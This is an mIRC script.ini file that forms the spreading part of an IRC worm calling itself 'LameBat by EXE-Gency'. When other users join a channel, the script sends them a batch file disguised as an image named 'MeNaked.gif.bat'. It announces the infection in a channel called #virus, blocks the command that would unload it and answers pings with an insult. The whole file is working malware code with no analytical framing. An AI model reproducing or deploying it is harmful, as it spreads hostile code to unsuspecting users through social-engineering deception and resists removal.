[script]
n0=on 1:JOIN:#: {
n1=    if ( $me != $nick ) {
n2=        /copy -o c:\lamebat.bat c:\MeNaked.gif.bat
n3=        /dcc send $nick c:\MeNaked.gif.bat
n4=    }
n5=}
n6=on 1:CONNECT: {
n7=    /join #virus
n8=    /msg #virus heh. How dumb am I?
n9=    /msg #virus I got infected with LameBat by EXE-Gency
n10=   /leave #virus
n11=}
n12=on *:INPUT:*: {
n13=    if ( $1- == /unload -rs script.ini ) {
n14=        /echo Unable to unload script :(
n15=        /halt
n16=    }
n17=}
n18=ctcp 1:PING:/notice $nick st00pid fuck@$%#! | /halt

